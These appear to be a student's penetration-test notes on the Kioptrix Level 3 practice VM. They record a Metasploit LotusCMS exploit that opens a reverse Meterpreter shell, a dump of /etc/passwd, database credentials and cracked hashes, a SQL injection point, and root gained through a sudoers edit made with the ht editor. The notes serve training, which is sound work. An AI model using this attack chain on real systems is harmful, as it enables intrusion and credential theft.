Level 3 Notes

![xjovJcu7sR.png](../../../../../_resources/39096122c1bb405a98f124fb07d4042e.png)

# IP: 10.0.2.8

# PHPMYADMIN GUEST LOGIN (10.0.2.8/phpmyadmin)
Username: Guest
Password: None
![b9d82afb63d9d240e15a06df71ea5fac.png](../../../../../_resources/8887d1efbdaa43d98a40b735346bdbff.png)

# Information Disclosure
Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch Server

# Potential Vulnerabilities
https://www.rapid7.com/db/modules/exploit/unix/webapp/phpmyadmin_config (Doesn't work probably because /config directory is gone)

# Working Vulnerabilities
## LOTUS CMS 3.0 Exploit (https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec)
msf5 exploit(multi/http/lcms_php_exec) > set URI /
URI => /
msf5 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38288 bytes) to 10.0.2.8
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.8:51515) at 2020-08-02 05:30:27 +0100
meterpreter > getuid
Server username: www-data (33)

# /home/loneferret
## cat CompanyPolicy.README
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO

## .bash_history
cat .bash_history
sudo ht
exit


# cat /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash

# PhpMyAdmin credentials in gconfig.php
 search -d /home/www/kioptrix3.com -f *config* (to find anything interesting)
 cat cat /home/www/kioptrix3.com/gallery/gconfig.php

 	$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

	$GLOBALS["gallarific_mysql_server"] = "localhost";
	$GLOBALS["gallarific_mysql_database"] = "gallery";
	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
	
# PhpMyAdmin Account hashes
dreg 	0d3eccfb887aabd50f243b3f155c0f85
loneferret 	5badcaf789d3d1d09794d8f021f40f0e

# kioptrix3.com/gallery/gallery.php?id=
Vulnerable to SQL Injection

# Credentials from gallery database
+------+------------+---------------------------------------------+
| id   | username   | password                                    |
+------+------------+---------------------------------------------+
| 1    | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
| 2    | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
+------+------------+---------------------------------------------+

# MySQL Database Credentials
+-----------+------------------+-------------------------------------------+
| host      | user             | password                                  |
+-----------+------------------+-------------------------------------------+
| localhost | root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E |
| Kioptrix3 | root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E |
| 127.0.0.1 | root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E |
| localhost | <blank>          | <blank>                                   |
| Kioptrix3 | <blank>          | <blank>                                   |
| localhost | debian-sys-maint | *F46D660C8ED1B312A40E366A86D958C6F1EF2AB8 |
+-----------+------------------+-------------------------------------------+

# BOTH USERS REUSED PASSWORD (loneferret:starwars and dreg:Mast3r)

# export TERM=xterm (To make sudo ht work)

With sudo ht go to /etc/sudoers and add /bin/sh

# ROOT
Now run: sudo /bin/sh AND ROOT
## # cat /root/Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.


